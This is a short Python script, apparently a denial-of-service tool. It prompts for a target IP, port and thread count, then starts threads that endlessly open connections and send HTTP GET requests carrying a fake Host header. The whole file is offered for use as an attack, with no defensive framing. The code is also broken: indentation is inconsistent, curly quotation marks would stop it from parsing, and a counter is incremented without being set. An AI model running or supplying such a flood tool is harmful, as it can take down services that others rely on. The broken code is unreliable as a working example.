import socket
import threading
import os
import ipaddress

target = str(input("Insert target’s IP: "))
port = int(input("Insert Port: "))
Trd = int(input("Insert number of Threads: "))
fake_ip = '44.192.193.194'

try:
    target_ip = ipaddress.ip_address(target)
except ValueError:
    print("Invalid IP address!")
    exit()

if not (0 < port < 65536):
    print("Invalid port number!")
    exit()

def attack():
 while True:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((target, port))
 s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode(’ascii’), (target, port))
 s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode(’ascii’), (target, port))
 s.close()

  for i in range(Trd):
 thread = threading.Thread(target=attack)
 thread.start()

global attack_num
 attack_num += 1
 print(attack_num)


